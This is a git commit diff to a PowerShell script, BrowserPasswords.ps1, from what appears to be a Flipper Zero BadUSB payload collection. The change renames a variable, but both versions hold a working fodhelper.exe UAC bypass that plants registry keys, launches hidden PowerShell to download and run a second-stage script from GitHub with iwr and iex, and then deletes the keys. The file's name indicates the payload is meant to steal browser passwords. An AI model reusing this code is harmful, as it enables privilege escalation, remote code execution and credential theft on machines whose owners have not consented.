8af8f855691600e3d1dabc9814f4f169767a278c
I-Am-Jakoby <Michaelryanchitwood@gmail.com>
2022-12-29 18:46:16 -0600

    Update BrowserPasswords.ps1

--- Payloads/Flip-BrowserPasswords/BrowserPasswords.ps1
+++ Payloads/Flip-BrowserPasswords/BrowserPasswords.ps1
@@ -2,8 +2,8 @@ function s1 {
 	$user = "$env:COMPUTERNAME\$env:USERNAME"
 	$isAdmin = (Get-LocalGroupMember 'Administrators').Name -contains $user
 if($isAdmin){
-	$259="powershell.exe -w h iwr https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/Payloads/Flip-BrowserPasswords/s2.ps1 | iex";
-	reg add "HKCU\Software\Classes\.259\Shell\Open\command" /d $259 /f;reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".259" /f;fodhelper.exe;Start-Sleep -s 3;reg delete "HKCU\Software\Classes\.259\" /f;reg delete "HKCU\Software\Classes\ms-settings\" /f;
+	$fuck="powershell.exe -w h iwr https://raw.githubusercontent.com/I-Am-Jakoby/Flipper-Zero-BadUSB/main/Payloads/Flip-BrowserPasswords/s2.ps1 | iex";
+	reg add "HKCU\Software\Classes\.fuck\Shell\Open\command" /d $fuck /f;reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".fuck" /f;fodhelper.exe;Start-Sleep -s 3;reg delete "HKCU\Software\Classes\.fuck\" /f;reg delete "HKCU\Software\Classes\ms-settings\" /f;
 
 	}
 	else{
